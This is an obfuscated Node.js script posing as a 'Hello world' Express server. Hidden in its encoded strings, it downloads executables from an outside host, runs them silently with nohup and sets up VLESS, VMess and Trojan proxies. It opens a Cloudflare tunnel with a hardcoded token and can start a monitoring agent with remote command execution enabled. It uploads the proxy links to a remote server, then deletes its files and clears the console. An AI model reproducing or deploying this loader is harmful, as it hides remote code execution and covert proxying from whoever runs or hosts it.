const _0x1de883=_0x1274;function _0x1274(_0x32ac0b,_0x327c77){const _0x37af67=_0x37af();return _0x1274=function(_0x12741e,_0x46bdf5){_0x12741e=_0x12741e-0x87;let _0x561f48=_0x37af67[_0x12741e];return _0x561f48;},_0x1274(_0x32ac0b,_0x327c77);}(function(_0x561909,_0x45394c){const _0x495608=_0x1274,_0x239680=_0x561909();while(!![]){try{const _0x49c6e1=-parseInt(_0x495608(0xe4))/0x1*(parseInt(_0x495608(0x9b))/0x2)+-parseInt(_0x495608(0xa5))/0x3*(-parseInt(_0x495608(0x127))/0x4)+parseInt(_0x495608(0x91))/0x5*(parseInt(_0x495608(0xc0))/0x6)+parseInt(_0x495608(0xd1))/0x7*(-parseInt(_0x495608(0xbb))/0x8)+-parseInt(_0x495608(0x130))/0x9+parseInt(_0x495608(0x9f))/0xa*(-parseInt(_0x495608(0x9e))/0xb)+parseInt(_0x495608(0x118))/0xc;if(_0x49c6e1===_0x45394c)break;else _0x239680['push'](_0x239680['shift']());}catch(_0x2d0e10){_0x239680['push'](_0x239680['shift']());}}}(_0x37af,0x43fcf));const express=require(_0x1de883(0x111)),app=express(),axios=require(_0x1de883(0x11a)),os=require('os'),fs=require('fs'),path=require(_0x1de883(0x107)),{promisify}=require('util'),exec=promisify(require(_0x1de883(0xac))[_0x1de883(0x8d)]),{execSync}=require(_0x1de883(0xac)),UPLOAD_URL=process[_0x1de883(0xcb)]['UPLOAD_URL']||'',PROJECT_URL=process[_0x1de883(0xcb)][_0x1de883(0x105)]||'',AUTO_ACCESS=process['env']['AUTO_ACCESS']||![],FILE_PATH=process[_0x1de883(0xcb)][_0x1de883(0x92)]||_0x1de883(0x11f),SUB_PATH=process[_0x1de883(0xcb)][_0x1de883(0xf1)]||_0x1de883(0x148),PORT=process['env'][_0x1de883(0xcc)]||process[_0x1de883(0xcb)]['PORT']||0xbb8,UUID=process['env'][_0x1de883(0x88)]||_0x1de883(0x96),NEZHA_SERVER=process[_0x1de883(0xcb)][_0x1de883(0x87)]||'',NEZHA_PORT=process[_0x1de883(0xcb)][_0x1de883(0xa7)]||'',NEZHA_KEY=process[_0x1de883(0xcb)][_0x1de883(0xa4)]||'',ARGO_DOMAIN=process[_0x1de883(0xcb)]['ARGO_DOMAIN']||_0x1de883(0xaf),ARGO_AUTH=process[_0x1de883(0xcb)][_0x1de883(0xe0)]||'service\x20install\x20eyJhIjoiZjZmZGMwN2E0OWZiZDllZDBmMDJkY2IzZWYyYTNkNmQiLCJ0IjoiMjE2NWYxYzEtOGIwYy00YjQxLWE5OWMtYjhmOWEyMjllZGQwIiwicyI6Ik1XWTNPRE0wWWprdE1qVTVPUzAwTkRaaUxUazVZVFV0TXpJMllqaGpOell6TWpnMiJ9',ARGO_PORT=process[_0x1de883(0xcb)][_0x1de883(0x93)]||0x1f41,CFIP=process[_0x1de883(0xcb)]['CFIP']||_0x1de883(0x12a),CFPORT=process[_0x1de883(0xcb)][_0x1de883(0x12d)]||0x1bb,NAME=process[_0x1de883(0xcb)][_0x1de883(0xbe)]||_0x1de883(0xb4);!fs[_0x1de883(0x8e)](FILE_PATH)?(fs[_0x1de883(0x12c)](FILE_PATH),console[_0x1de883(0x90)](FILE_PATH+_0x1de883(0xfd))):console['log'](FILE_PATH+_0x1de883(0xda));function generateRandomName(){const _0x2ddaa5=_0x1de883,_0xacdf11=_0x2ddaa5(0x9c);let _0x5e1491='';for(let _0x1365ec=0x0;_0x1365ec<0x6;_0x1365ec++){_0x5e1491+=_0xacdf11[_0x2ddaa5(0x8b)](Math['floor'](Math[_0x2ddaa5(0xe5)]()*_0xacdf11[_0x2ddaa5(0xc7)]));}return _0x5e1491;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path[_0x1de883(0xcd)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path['join'](FILE_PATH,_0x1de883(0xaa)),listPath=path['join'](FILE_PATH,_0x1de883(0xf8)),bootLogPath=path[_0x1de883(0xcd)](FILE_PATH,_0x1de883(0x141)),configPath=path['join'](FILE_PATH,_0x1de883(0xfe));function deleteNodes(){const _0x4f134f=_0x1de883;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x765a75;try{_0x765a75=fs[_0x4f134f(0x9a)](subPath,_0x4f134f(0x128));}catch{return null;}const _0x596956=Buffer[_0x4f134f(0x10e)](_0x765a75,_0x4f134f(0x121))[_0x4f134f(0xdc)](_0x4f134f(0x128)),_0x4f37d4=_0x596956[_0x4f134f(0xfc)]('\x0a')['filter'](_0x5ec141=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x5ec141));if(_0x4f37d4['length']===0x0)return;return axios['post'](UPLOAD_URL+_0x4f134f(0xa8),JSON['stringify']({'nodes':_0x4f37d4}),{'headers':{'Content-Type':'application/json'}})['catch'](_0x2c4dd3=>{return null;}),null;}catch(_0x4e2b13){return null;}}function cleanupOldFiles(){const _0x3d3048=_0x1de883;try{const _0x1573f3=fs[_0x3d3048(0xb7)](FILE_PATH);_0x1573f3['forEach'](_0x5f3e10=>{const _0x1211ad=_0x3d3048,_0x1558c8=path['join'](FILE_PATH,_0x5f3e10);try{const _0x2b3fa3=fs['statSync'](_0x1558c8);_0x2b3fa3[_0x1211ad(0x137)]()&&fs['unlinkSync'](_0x1558c8);}catch(_0x513d02){}});}catch(_0x3269b7){}}app[_0x1de883(0x135)]('/',function(_0x1d43f8,_0x537170){const _0x4d9509=_0x1de883;_0x537170[_0x4d9509(0xe7)]('Hello\x20world!');});async function generateConfig(){const _0x1bce0a=_0x1de883,_0x35533b={'log':{'access':_0x1bce0a(0xfb),'error':'/dev/null','loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0x1bce0a(0x103),'settings':{'clients':[{'id':UUID,'flow':_0x1bce0a(0x11d)}],'decryption':_0x1bce0a(0x113),'fallbacks':[{'dest':0xbb9},{'path':_0x1bce0a(0xd2),'dest':0xbba},{'path':_0x1bce0a(0xa0),'dest':0xbbb},{'path':_0x1bce0a(0x102),'dest':0xbbc}]},'streamSettings':{'network':_0x1bce0a(0xd6)}},{'port':0xbb9,'listen':'127.0.0.1','protocol':_0x1bce0a(0x103),'settings':{'clients':[{'id':UUID}],'decryption':_0x1bce0a(0x113)},'streamSettings':{'network':'tcp','security':_0x1bce0a(0x113)}},{'port':0xbba,'listen':_0x1bce0a(0xf7),'protocol':_0x1bce0a(0x103),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x1bce0a(0x113),'wsSettings':{'path':_0x1bce0a(0xd2)}},'sniffing':{'enabled':!![],'destOverride':[_0x1bce0a(0x115),_0x1bce0a(0xab),_0x1bce0a(0xe2)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x1bce0a(0xf7),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':['http',_0x1bce0a(0xab),_0x1bce0a(0xe2)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x1bce0a(0xf7),'protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x1bce0a(0x113),'wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x1bce0a(0x115),_0x1bce0a(0xab),_0x1bce0a(0xe2)],'metadataOnly':![]}}],'dns':{'servers':[_0x1bce0a(0x10a)]},'outbounds':[{'protocol':_0x1bce0a(0x129),'tag':_0x1bce0a(0xe9)},{'protocol':'blackhole','tag':_0x1bce0a(0xfa)}]};fs[_0x1bce0a(0x8f)](path['join'](FILE_PATH,'config.json'),JSON[_0x1bce0a(0xf2)](_0x35533b,null,0x2));}function getSystemArchitecture(){const _0x7a0220=_0x1de883,_0x3b534f=os[_0x7a0220(0xff)]();return _0x3b534f==='arm'||_0x3b534f===_0x7a0220(0x140)||_0x3b534f===_0x7a0220(0x10c)?_0x7a0220(0xea):_0x7a0220(0xd4);}function downloadFile(_0x569518,_0x257e13,_0x375cc5){const _0x2e2c5f=_0x1de883,_0x1c98a3=_0x569518;!fs[_0x2e2c5f(0x8e)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x11b947=fs[_0x2e2c5f(0x133)](_0x1c98a3);axios({'method':_0x2e2c5f(0x135),'url':_0x257e13,'responseType':_0x2e2c5f(0xc4)})[_0x2e2c5f(0xa6)](_0x27656e=>{_0x27656e['data']['pipe'](_0x11b947),_0x11b947['on']('finish',()=>{const _0x28cd26=_0x1274;_0x11b947[_0x28cd26(0x146)](),console['log'](_0x28cd26(0x134)+path[_0x28cd26(0x13a)](_0x1c98a3)+_0x28cd26(0xb6)),_0x375cc5(null,_0x1c98a3);}),_0x11b947['on']('error',_0x856486=>{const _0x63738d=_0x1274;fs[_0x63738d(0x97)](_0x1c98a3,()=>{});const _0x342e95='Download\x20'+path[_0x63738d(0x13a)](_0x1c98a3)+'\x20failed:\x20'+_0x856486[_0x63738d(0xd5)];console[_0x63738d(0x95)](_0x342e95),_0x375cc5(_0x342e95);});})[_0x2e2c5f(0xf5)](_0x3a664a=>{const _0x24ffea=_0x2e2c5f,_0x395376='Download\x20'+path[_0x24ffea(0x13a)](_0x1c98a3)+_0x24ffea(0xc3)+_0x3a664a[_0x24ffea(0xd5)];console[_0x24ffea(0x95)](_0x395376),_0x375cc5(_0x395376);});}function _0x37af(){const _0x1aeb8c=['npm\x20running\x20error:\x20','none','http\x20server\x20is\x20running\x20on\x20port:','http','.exe\x20>\x20nul\x202>&1','\x20-c\x20\x22','14650668lVOxZb','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','axios','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','\x0a\x20\x20tunnel:\x20','xtls-rprx-vision','Empowerment\x20failed\x20for\x20','./tmp','\x20>/dev/null\x202>&1','base64','https://oooo.serv00.net/add-url','https://amd64.ssss.nyc.mn/v1','win32','&fp=firefox&type=ws&host=','includes','36572wufooT','utf-8','freedom','cdns.doon.eu.org','platform','mkdirSync','CFPORT','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','3890187zclsqA','taskkill\x20/f\x20/im\x20','substring','createWriteStream','Download\x20','get','clear','isFile','&path=%2Fvless-argo%3Fed%3D2560#','unlinkSync','basename','del\x20/f\x20/q\x20','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','Subscription\x20uploaded\x20successfully','https://amd64.ssss.nyc.mn/web','web\x20running\x20error:\x20','arm64','boot.log','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','match','\x22\x20>\x20/dev/null\x202>&1','Nodes\x20uploaded\x20successfully','close','application/json','sub','NEZHA_SERVER','UUID','\x0a\x20\x20\x20\x20','2096','charAt','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','exec','existsSync','writeFileSync','log','7705hbrLqV','FILE_PATH','ARGO_PORT','\x0a\x20\x20\x0avmess://','error','ff7df342-963c-49af-8c31-bc149b03f34d','unlink','\x0a\x20\x20credentials-file:\x20','Error\x20reading\x20boot.log:','readFileSync','1114JHUHAF','abcdefghijklmnopqrstuvwxyz','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','1067aWqMON','55510plXFeL','/vmess-argo','2053','ArgoDomain:','fileName','NEZHA_KEY','99amrpZA','then','NEZHA_PORT','/api/delete-nodes','pkill\x20-f\x20\x22[','sub.txt','tls','child_process','text/plain;\x20charset=utf-8','Skipping\x20adding\x20automatic\x20access\x20task','serv00.5559027.xyz','chmod','Empowerment\x20success\x20for\x20','nohup\x20','trim','railway','2083','\x20successfully','readdirSync','Error\x20executing\x20command:\x20','Content-Type','\x20>\x20nul\x202>&1','33288UyeFCZ','\x20-p\x20','tunnel.json','NAME','forEach','1002pDvIBU','unshift','&path=%2Ftrojan-argo%3Fed%3D2560#','\x20failed:\x20','stream','response','listen','length','map','/config.json\x20>/dev/null\x202>&1\x20&','443','env','SERVER_PORT','join','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','\x20-c\x20','automatic\x20access\x20task\x20added\x20successfully','133PhLkxA','/vless-argo','/api/add-nodes','amd','message','tcp','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','test','set','\x20already\x20exists','php\x20running\x20error:\x20','toString','/tunnel.yml\x20run','\x20>/dev/null\x202>&1\x20&','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','ARGO_AUTH','?encryption=none&security=tls&sni=','quic','8443','811BWbbMM','random','Error\x20in\x20startserver:','send','https://amd64.ssss.nyc.mn/bot','direct','arm','filter','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','/sub.txt\x20saved\x20successfully','https://arm64.ssss.nyc.mn/bot','\x0a\x20\x20\x0atrojan://','NEZHA\x20variable\x20is\x20empty,skip\x20running','SUB_PATH','stringify','Unhandled\x20error\x20in\x20startserver:','status','catch','true','127.0.0.1','list.txt','post','block','/dev/null','split','\x20is\x20created','config.json','arch','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','pop','/trojan-argo','vless','\x20is\x20running','PROJECT_URL','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','path','https://arm64.ssss.nyc.mn/agent','App\x20is\x20running','https+local://8.8.8.8/dns-query','https://arm64.ssss.nyc.mn/v1','aarch64','/api/add-subscriptions','from','push','2087','express'];_0x37af=function(){return _0x1aeb8c;};return _0x37af();}async function downloadFilesAndRun(){const _0x4e2122=_0x1de883,_0x23a527=getSystemArchitecture(),_0x5db7e2=getFilesForArchitecture(_0x23a527);if(_0x5db7e2[_0x4e2122(0xc7)]===0x0){console['log']('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x4a74ee=_0x5db7e2[_0x4e2122(0xc8)](_0x44ab6c=>{return new Promise((_0x365afe,_0x342e4b)=>{const _0x1c37cb=_0x1274;downloadFile(_0x44ab6c[_0x1c37cb(0xa3)],_0x44ab6c['fileUrl'],(_0x44fc3c,_0x5b959b)=>{_0x44fc3c?_0x342e4b(_0x44fc3c):_0x365afe(_0x5b959b);});});});try{await Promise['all'](_0x4a74ee);}catch(_0x1a90b6){console[_0x4e2122(0x95)]('Error\x20downloading\x20files:',_0x1a90b6);return;}function _0x2fa94a(_0x5b4249){const _0x1082a1=_0x4e2122,_0x289345=0x1fd;_0x5b4249[_0x1082a1(0xbf)](_0x1f7ad2=>{const _0x48945e=_0x1082a1;fs[_0x48945e(0x8e)](_0x1f7ad2)&&fs[_0x48945e(0xb0)](_0x1f7ad2,_0x289345,_0x4470eb=>{const _0x5521ce=_0x48945e;_0x4470eb?console[_0x5521ce(0x95)](_0x5521ce(0x11e)+_0x1f7ad2+':\x20'+_0x4470eb):console[_0x5521ce(0x90)](_0x5521ce(0xb1)+_0x1f7ad2+':\x20'+_0x289345[_0x5521ce(0xdc)](0x8));});});}const _0x5a7ea5=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x2fa94a(_0x5a7ea5);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x58f5e5=NEZHA_SERVER[_0x4e2122(0x126)](':')?NEZHA_SERVER[_0x4e2122(0xfc)](':')[_0x4e2122(0x101)]():'',_0x127324=new Set([_0x4e2122(0xca),'8443',_0x4e2122(0x8a),'2087',_0x4e2122(0xb5),_0x4e2122(0xa1)]),_0x296d76=_0x127324['has'](_0x58f5e5)?_0x4e2122(0xf6):'false',_0x24ef08='\x0aclient_secret:\x20'+NEZHA_KEY+_0x4e2122(0x11b)+NEZHA_SERVER+_0x4e2122(0x119)+_0x296d76+_0x4e2122(0xce)+UUID;fs['writeFileSync'](path[_0x4e2122(0xcd)](FILE_PATH,'config.yaml'),_0x24ef08);const _0x5db524=_0x4e2122(0xb2)+phpPath+_0x4e2122(0x117)+FILE_PATH+_0x4e2122(0x12f);try{await exec(_0x5db524),console[_0x4e2122(0x90)](phpName+_0x4e2122(0x104)),await new Promise(_0x1dec0d=>setTimeout(_0x1dec0d,0x3e8));}catch(_0x959a89){console['error'](_0x4e2122(0xdb)+_0x959a89);}}else{let _0x2b0cef='';const _0x333c1f=[_0x4e2122(0xca),_0x4e2122(0xe3),_0x4e2122(0x8a),_0x4e2122(0x110),_0x4e2122(0xb5),'2053'];_0x333c1f['includes'](NEZHA_PORT)&&(_0x2b0cef='--tls');const _0x4f3ca0=_0x4e2122(0xb2)+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x4e2122(0xbc)+NEZHA_KEY+'\x20'+_0x2b0cef+_0x4e2122(0x13c);try{await exec(_0x4f3ca0),console[_0x4e2122(0x90)](npmName+'\x20is\x20running'),await new Promise(_0xb729a0=>setTimeout(_0xb729a0,0x3e8));}catch(_0x5c4309){console[_0x4e2122(0x95)](_0x4e2122(0x112)+_0x5c4309);}}}else console['log'](_0x4e2122(0xf0));const _0xc2fea=_0x4e2122(0xb2)+webPath+_0x4e2122(0xcf)+FILE_PATH+_0x4e2122(0xc9);try{await exec(_0xc2fea),console['log'](webName+_0x4e2122(0x104)),await new Promise(_0x15c656=>setTimeout(_0x15c656,0x3e8));}catch(_0x52bd2f){console[_0x4e2122(0x95)](_0x4e2122(0x13f)+_0x52bd2f);}if(fs[_0x4e2122(0x8e)](botPath)){let _0x3db4fd;if(ARGO_AUTH[_0x4e2122(0x143)](/^[A-Z0-9a-z=]{120,250}$/))_0x3db4fd='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x3db4fd=_0x4e2122(0x8c)+FILE_PATH+_0x4e2122(0xdd):_0x3db4fd='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x3db4fd+_0x4e2122(0xde)),console[_0x4e2122(0x90)](botName+_0x4e2122(0x104)),await new Promise(_0x1bafd7=>setTimeout(_0x1bafd7,0x7d0));}catch(_0x322db5){console[_0x4e2122(0x95)](_0x4e2122(0xb8)+_0x322db5);}}await new Promise(_0x57c0c4=>setTimeout(_0x57c0c4,0x1388));}function getFilesForArchitecture(_0x4d6eac){const _0x4435f3=_0x1de883;let _0xa3fb55;_0x4d6eac==='arm'?_0xa3fb55=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x4435f3(0xee)}]:_0xa3fb55=[{'fileName':webPath,'fileUrl':_0x4435f3(0x13e)},{'fileName':botPath,'fileUrl':_0x4435f3(0xe8)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x237a93=_0x4d6eac===_0x4435f3(0xea)?_0x4435f3(0x108):'https://amd64.ssss.nyc.mn/agent';_0xa3fb55[_0x4435f3(0xc1)]({'fileName':npmPath,'fileUrl':_0x237a93});}else{const _0xb6048e=_0x4d6eac===_0x4435f3(0xea)?_0x4435f3(0x10b):_0x4435f3(0x123);_0xa3fb55[_0x4435f3(0xc1)]({'fileName':phpPath,'fileUrl':_0xb6048e});}}return _0xa3fb55;}function argoType(){const _0x1a44cf=_0x1de883;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x1a44cf(0x90)](_0x1a44cf(0x106));return;}if(ARGO_AUTH[_0x1a44cf(0x126)]('TunnelSecret')){fs['writeFileSync'](path['join'](FILE_PATH,_0x1a44cf(0xbd)),ARGO_AUTH);const _0xa0778f=_0x1a44cf(0x11c)+ARGO_AUTH[_0x1a44cf(0xfc)]('\x22')[0xb]+_0x1a44cf(0x98)+path[_0x1a44cf(0xcd)](FILE_PATH,_0x1a44cf(0xbd))+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+_0x1a44cf(0x100)+ARGO_PORT+_0x1a44cf(0xdf);fs[_0x1a44cf(0x8f)](path[_0x1a44cf(0xcd)](FILE_PATH,'tunnel.yml'),_0xa0778f);}else console[_0x1a44cf(0x90)](_0x1a44cf(0x12e));}argoType();async function extractDomains(){const _0x124d30=_0x1de883;let _0xc33e94;if(ARGO_AUTH&&ARGO_DOMAIN)_0xc33e94=ARGO_DOMAIN,console[_0x124d30(0x90)]('ARGO_DOMAIN:',_0xc33e94),await _0x1d568a(_0xc33e94);else try{const _0x4c7710=fs['readFileSync'](path['join'](FILE_PATH,_0x124d30(0x141)),_0x124d30(0x128)),_0x1e1392=_0x4c7710[_0x124d30(0xfc)]('\x0a'),_0xe11b68=[];_0x1e1392[_0x124d30(0xbf)](_0x29b345=>{const _0x229ac5=_0x124d30,_0x5d4cc2=_0x29b345[_0x229ac5(0x143)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x5d4cc2){const _0x93cad=_0x5d4cc2[0x1];_0xe11b68[_0x229ac5(0x10f)](_0x93cad);}});if(_0xe11b68[_0x124d30(0xc7)]>0x0)_0xc33e94=_0xe11b68[0x0],console[_0x124d30(0x90)](_0x124d30(0xa2),_0xc33e94),await _0x1d568a(_0xc33e94);else{console[_0x124d30(0x90)](_0x124d30(0xd7)),fs[_0x124d30(0x139)](path[_0x124d30(0xcd)](FILE_PATH,_0x124d30(0x141)));async function _0xdd116f(){const _0x14e93d=_0x124d30;try{process[_0x14e93d(0x12b)]===_0x14e93d(0x124)?await exec(_0x14e93d(0x131)+botName+_0x14e93d(0x116)):await exec(_0x14e93d(0xa9)+botName[_0x14e93d(0x8b)](0x0)+']'+botName[_0x14e93d(0x132)](0x1)+_0x14e93d(0x144));}catch(_0x5b9748){}}_0xdd116f(),await new Promise(_0x41f353=>setTimeout(_0x41f353,0xbb8));const _0x51ab24=_0x124d30(0x142)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x51ab24+_0x124d30(0xde)),console[_0x124d30(0x90)](botName+_0x124d30(0x104)),await new Promise(_0x42f8b6=>setTimeout(_0x42f8b6,0xbb8)),await extractDomains();}catch(_0xa85206){console[_0x124d30(0x95)](_0x124d30(0xb8)+_0xa85206);}}}catch(_0x5e2bb){console[_0x124d30(0x95)](_0x124d30(0x99),_0x5e2bb);}async function _0x1d568a(_0x45808a){const _0x2c3f80=_0x124d30,_0x337add=execSync(_0x2c3f80(0x9d),{'encoding':_0x2c3f80(0x128)}),_0x5db5b8=_0x337add[_0x2c3f80(0xb3)](),_0xf4d749=NAME?NAME+'-'+_0x5db5b8:_0x5db5b8;return new Promise(_0x447146=>{setTimeout(()=>{const _0x3927ce=_0x1274,_0x4c437c={'v':'2','ps':''+_0xf4d749,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':_0x3927ce(0x113),'host':_0x45808a,'path':'/vmess-argo?ed=2560','tls':'tls','sni':_0x45808a,'alpn':'','fp':'firefox'},_0x388f09='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x3927ce(0xe1)+_0x45808a+_0x3927ce(0x125)+_0x45808a+_0x3927ce(0x138)+_0xf4d749+_0x3927ce(0x94)+Buffer[_0x3927ce(0x10e)](JSON[_0x3927ce(0xf2)](_0x4c437c))[_0x3927ce(0xdc)]('base64')+_0x3927ce(0xef)+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x45808a+_0x3927ce(0x125)+_0x45808a+_0x3927ce(0xc2)+_0xf4d749+_0x3927ce(0x89);console[_0x3927ce(0x90)](Buffer[_0x3927ce(0x10e)](_0x388f09)[_0x3927ce(0xdc)](_0x3927ce(0x121))),fs['writeFileSync'](subPath,Buffer[_0x3927ce(0x10e)](_0x388f09)[_0x3927ce(0xdc)]('base64')),console[_0x3927ce(0x90)](FILE_PATH+_0x3927ce(0xed)),uploadNodes(),app[_0x3927ce(0x135)]('/'+SUB_PATH,(_0x5995e6,_0x51cde4)=>{const _0x2afa82=_0x3927ce,_0x4bf1d3=Buffer[_0x2afa82(0x10e)](_0x388f09)[_0x2afa82(0xdc)](_0x2afa82(0x121));_0x51cde4[_0x2afa82(0xd9)](_0x2afa82(0xb9),_0x2afa82(0xad)),_0x51cde4[_0x2afa82(0xe7)](_0x4bf1d3);}),_0x447146(_0x388f09);},0x7d0);});}}async function uploadNodes(){const _0xf9bc7b=_0x1de883;if(UPLOAD_URL&&PROJECT_URL){const _0x327043=PROJECT_URL+'/'+SUB_PATH,_0x41144a={'subscription':[_0x327043]};try{const _0x537487=await axios[_0xf9bc7b(0xf9)](UPLOAD_URL+_0xf9bc7b(0x10d),_0x41144a,{'headers':{'Content-Type':_0xf9bc7b(0x147)}});return _0x537487&&_0x537487[_0xf9bc7b(0xf4)]===0xc8?(console[_0xf9bc7b(0x90)](_0xf9bc7b(0x13d)),_0x537487):null;}catch(_0x54381e){if(_0x54381e['response']){if(_0x54381e[_0xf9bc7b(0xc5)][_0xf9bc7b(0xf4)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0xf9bc7b(0x8e)](listPath))return;const _0x3ae828=fs[_0xf9bc7b(0x9a)](listPath,_0xf9bc7b(0x128)),_0x40f038=_0x3ae828['split']('\x0a')[_0xf9bc7b(0xeb)](_0x586295=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0xf9bc7b(0xd8)](_0x586295));if(_0x40f038[_0xf9bc7b(0xc7)]===0x0)return;const _0x3751fe=JSON[_0xf9bc7b(0xf2)]({'nodes':_0x40f038});try{const _0x52a3fd=await axios['post'](UPLOAD_URL+_0xf9bc7b(0xd3),_0x3751fe,{'headers':{'Content-Type':_0xf9bc7b(0x147)}});return _0x52a3fd&&_0x52a3fd[_0xf9bc7b(0xf4)]===0xc8?(console['log'](_0xf9bc7b(0x145)),_0x52a3fd):null;}catch(_0x2c689d){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x5db103=_0x1274,_0x174f93=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x174f93[_0x5db103(0x10f)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x174f93[_0x5db103(0x10f)](phpPath);process[_0x5db103(0x12b)]===_0x5db103(0x124)?exec(_0x5db103(0x13b)+_0x174f93[_0x5db103(0xcd)]('\x20')+_0x5db103(0xba),_0x51acb4=>{const _0x3d76f9=_0x5db103;console[_0x3d76f9(0x136)](),console[_0x3d76f9(0x90)](_0x3d76f9(0x109)),console[_0x3d76f9(0x90)](_0x3d76f9(0xec));}):exec('rm\x20-rf\x20'+_0x174f93[_0x5db103(0xcd)]('\x20')+_0x5db103(0x120),_0x17349f=>{const _0x44bc42=_0x5db103;console['clear'](),console['log'](_0x44bc42(0x109)),console[_0x44bc42(0x90)](_0x44bc42(0xec));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x2a4835=_0x1de883;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x2a4835(0x90)](_0x2a4835(0xae));return;}try{const _0x3b6263=await axios['post'](_0x2a4835(0x122),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x2a4835(0x147)}});return console[_0x2a4835(0x90)](_0x2a4835(0xd0)),_0x3b6263;}catch(_0x1b6bad){return console[_0x2a4835(0x95)]('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x1b6bad['message']),null;}}async function startserver(){const _0x45fb65=_0x1de883;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x229586){console[_0x45fb65(0x95)](_0x45fb65(0xe6),_0x229586);}}startserver()[_0x1de883(0xf5)](_0x55235c=>{const _0x14e87b=_0x1de883;console[_0x14e87b(0x95)](_0x14e87b(0xf3),_0x55235c);}),app[_0x1de883(0xc6)](PORT,()=>console[_0x1de883(0x90)](_0x1de883(0x114)+PORT+'!'));
